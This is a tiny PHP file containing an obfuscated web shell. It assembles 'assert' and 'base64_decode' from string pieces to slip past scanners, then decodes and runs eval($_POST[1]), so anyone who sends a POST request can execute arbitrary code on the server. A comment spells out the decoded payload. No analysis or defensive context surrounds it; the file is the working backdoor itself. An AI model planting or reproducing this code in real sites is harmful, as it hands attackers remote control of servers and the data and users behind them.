<?php
    $char_as='as';
    $char_e='e';
    $char_assert=$char_as.'s'.$char_e.'r'.'t';
    $char_base64_decode='b'.$char_as.$char_e.(64).'_'.'d'.$char_e.'c'.'o'.'d'.$char_e;
    @$char_assert(@$char_base64_decode('ZXZhbCgkX1BPU1RbMV0p'));
    //ZXZhbCgkX1BPU1RbMV0p: "eval($_POST[1])"
?>